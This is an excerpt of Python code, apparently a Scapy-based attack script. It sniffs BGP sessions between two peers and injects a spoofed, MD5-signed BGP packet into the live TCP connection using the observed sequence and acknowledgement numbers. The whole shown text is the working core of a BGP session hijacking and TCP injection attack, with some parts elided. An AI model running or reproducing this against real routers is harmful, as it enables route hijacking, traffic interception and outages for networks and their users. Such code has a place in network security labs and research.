...
def inject_malicious_packet(seq_num, ack_num, dst_port, window, src_port, mac_src, mac_dst):
    ...
    tcp.seq, tcp.ack, tcp.window = seq_num, ack_num, window
    ...
    malicious_packet = Ether(src=mac_src, dst=mac_dst) / ip / tcp / bgp_packet
    signed_malicious_packet = sign_single_packet(malicious_packet, BGP_password)

    # recompute packet to compute checksums
    signed_malicious_packet = signed_malicious_packet.__class__(bytes(signed_malicious_packet))
    signed_malicious_packet.show()
    # wrpcap('update_example_crafted .pcap', signed_packet)

    print("[*] Malicious packet crafted")
    sendp(signed_malicious_packet)
...
def packet_callback(captured_packet):
    ...
    if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
        ...
        if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
            ...
            inject_malicious_packet(captured_packet[TCP].seq + len(captured_packet[TCP].payload),
                                    captured_packet[TCP].ack,
                                    captured_packet[TCP].dport,
                                    captured_packet[TCP].window,
                                    captured_packet[TCP].sport,
                                    captured_packet[Ether].src,
                                    captured_packet[Ether].dst)
